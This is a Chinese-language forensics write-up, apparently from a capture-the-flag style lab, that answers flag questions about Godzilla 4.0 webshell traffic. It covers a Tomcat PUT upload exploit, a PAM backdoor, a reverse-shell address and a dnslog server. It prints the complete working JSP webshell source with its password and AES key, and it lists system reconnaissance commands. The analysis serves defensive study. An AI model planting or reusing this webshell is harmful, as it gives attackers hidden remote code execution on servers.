# 第六章-哥斯拉4.0流量分析

  
  
&lt;!--more--&gt;  
#### 1、黑客的 ip 是什么？  
`http`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291826241.png)
`flag{192.168.31.190}`  
#### 2、黑客是通过什么漏洞进入服务器的？（提交 CVE 编号）  
通过观察`http`流量，发现一个 PUT 请求比较可疑，并且利用成功  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828781.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291828685.png)
很明显利用的是 PUT 文件上传,并且通过服务器得知是`tomcat`中间件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291829092.png)
`flag{CVE-2017-12615}`  
#### 3、黑客上传的木马文件名是什么？(提交文件名)  
通过上面得知是`hello.jsp`  
`flag{hello.jsp}`  
#### 4、黑客上传的木马连接密码是什么？  
```jsp  
&lt;% !String xc = &#34;1710acba6220f62b&#34;;  
String pass = &#34;7f0e6f&#34;;  
String md5 = md5(pass &#43; xc);  
class X extends ClassLoader {  
    public X(ClassLoader z) {  
        super(z);  
    }  
    public Class Q(byte[] cb) {  
        return super.defineClass(cb, 0, cb.length);  
    }  
}  
public byte[] x(byte[] s, boolean m) {  
    try {  
        javax.crypto.Cipher c = javax.crypto.Cipher.getInstance(&#34;AES&#34;);  
        c.init(m ? 1 : 2, new javax.crypto.spec.SecretKeySpec(xc.getBytes(), &#34;AES&#34;));  
        return c.doFinal(s);  
    } catch (Exception e) {  
        return null;  
    }  
}  
public static String md5(String s) {  
    String ret = null;  
    try {  
        java.security.MessageDigest m;  
        m = java.security.MessageDigest.getInstance(&#34;MD5&#34;);  
        m.update(s.getBytes(), 0, s.length());  
        ret = new java.math.BigInteger(1, m.digest()).toString(16).toUpperCase();  
    } catch (Exception e) {}  
    return ret;  
}  
public static String base64Encode(byte[] bs) throws Exception {  
    Class base64;  
    String value = null;  
    try {  
        base64 = Class.forName(&#34;java.util.Base64&#34;);  
        Object Encoder = base64.getMethod(&#34;getEncoder&#34;, null).invoke(base64, null);  
        value = (String) Encoder.getClass().getMethod(&#34;encodeToString&#34;, new Class[] {  
            byte[].class  
        }).invoke(Encoder, new Object[] {  
            bs  
        });  
    } catch (Exception e) {  
        try {  
            base64 = Class.forName(&#34;sun.misc.BASE64Encoder&#34;);  
            Object Encoder = base64.newInstance();  
            value = (String) Encoder.getClass().getMethod(&#34;encode&#34;, new Class[] {  
                byte[].class  
            }).invoke(Encoder, new Object[] {  
                bs  
            });  
        } catch (Exception e2) {}  
    }  
    return value;  
}  
public static byte[] base64Decode(String bs) throws Exception {  
        Class base64;  
        byte[] value = null;  
        try {  
            base64 = Class.forName(&#34;java.util.Base64&#34;);  
            Object decoder = base64.getMethod(&#34;getDecoder&#34;, null).invoke(base64, null);  
            value = (byte[]) decoder.getClass().getMethod(&#34;decode&#34;, new Class[] {  
                String.class  
            }).invoke(decoder, new Object[] {  
                bs  
            });  
        } catch (Exception e) {  
            try {  
                base64 = Class.forName(&#34;sun.misc.BASE64Decoder&#34;);  
                Object decoder = base64.newInstance();  
                value = (byte[]) decoder.getClass().getMethod(&#34;decodeBuffer&#34;, new Class[] {  
                    String.class  
                }).invoke(decoder, new Object[] {  
                    bs  
                });  
            } catch (Exception e2) {}  
        }  
        return value;  
    } %&gt; &lt;%  
    try {  
        byte[] data = base64Decode(request.getParameter(pass));  
        data = x(data, false);  
        if (session.getAttribute(&#34;payload&#34;) == null) {  
            session.setAttribute(&#34;payload&#34;, new X(this.getClass().getClassLoader()).Q(data));  
        } else {  
            request.setAttribute(&#34;parameters&#34;, data);  
            java.io.ByteArrayOutputStream arrOut = new java.io.ByteArrayOutputStream();  
            Object f = ((Class) session.getAttribute(&#34;payload&#34;)).newInstance();  
            f.equals(arrOut);  
            f.equals(pageContext);  
            response.getWriter().write(md5.substring(0, 16));  
            f.toString();  
            response.getWriter().write(base64Encode(x(arrOut.toByteArray(), true)));  
            response.getWriter().write(md5.substring(16));  
        }  
    } catch (Exception e) {} %&gt;  
```  
提取关键内容  
`String pass = &#34;7f0e6f&#34;;`  
`flag{7f0e6f}`  
#### 5、黑客上传的木马解密密钥是什么？  
密钥就是`xc`  
`String xc = &#34;1710acba6220f62b&#34;;`  
`flag{1710acba6220f62b}`  
#### 6、黑客连接 webshell 后第一条命令是什么  
直接用`BlueTools`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291837490.png)
`flag{uname -r}`  
#### 7、黑客连接 webshell 时查询当前 shell 的权限是什么？第一条命令是什么？  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291839805.png)
`flag{root}`  
#### 8、黑客利用 webshell 执行命令查询服务器 Linux 系统发行版本是什么？  
常用的查询 linux 发型版本命令  
```  
lsb_release -a  
    命令显示Linux标准基础（LSB）的相关信息  
    包括发行版的名称、版本号等。  
  
    cat /etc/*release  
    命令显示/etc目录下所有以release结尾的文件内容  
    这些文件通常包含发行版的信息。  
  
    cat /etc/issue  
    命令显示系统的发行版信息，通常包括名称和版本号。  
  
    hostnamectl  
    命令显示系统信息，包括操作系统的名称和版本。  
  
    uname -a  
    显示内核相关信息，包括内核版本，但不会显示发行版的详细信息。  
  
    cat /proc/version  
    显示内核版本信息，类似于uname -r命令  
  
    cat /etc/os-release  
    文件包含系统发行版的详细信息，包括PRETTY_NAME，版本ID等。  
```  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291840820.png)
`flag{Debian GNU/Linux 10 (buster)}`  
#### 9、黑客利用 webshell 执行命令还查询并过滤了什么？（提交整条执行成功的命令）  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291841082.png)
但是通过解密返回包，这条命令并没有成功执行，继续找其他的  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843462.png)
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291843015.png)
这条命令成功执行了，黑客是在安装`PAM`后门  
`flag{dpkg -l libpam-modules:amd64}`  
#### 10、黑客留下后门的反连的 IP 和 PORT 是什么？（IP:PORT)  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291844834.png)
反弹`shell`命令，解密其中`base64`字符串  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291845735.png)
`flag{192.168.31.143:1313}`  
#### 11、黑客通过什么文件留下了后门？  
通过前面分析黑客一直在安装`pam`后门  
在数据包`56`发现黑客上传了`pam_unix.so`文件  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291852526.png)
`flag{pam_unix.so}`  
#### 12、黑客设置的后门密码是什么？  
在`/tmp`目录下面，并没有发现`pam_unix.so`文件，这里上服务器查询一下  
`find / -name &#34;pam*&#34; -type f -exec ls -lt {} &#43; 2&gt;/dev/null | sort -k 6,7`  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411291856603.png)
时间可疑，拖下来放入`ida`分析一下  
其`pam_sm_authenticate`是 `PAM`（可插拔认证模块）框架中的一个函数，主要用于用户身份验证。这个函数的作用是对用户提供的凭证（如密码）进行验证，通常是在 `PAM` 模块中实现的。  
![](https://picture-1304797147.cos.ap-nanjing.myqcloud.com/picture/202411292146656.png)
`flag{XJ@123}`  
#### 13、黑客的恶意 dnslog 服务器地址是什么？  
上面pam_unix.so中的dnslog地址   
`flag{c0ee2ad2d8.ipv6.xxx.eu.org.}`  

---

> Author: N1Rvana  
> URL: https://nlrvana.github.io/%E7%AC%AC%E5%85%AD%E7%AB%A0-%E5%93%A5%E6%96%AF%E6%8B%894.0%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/  

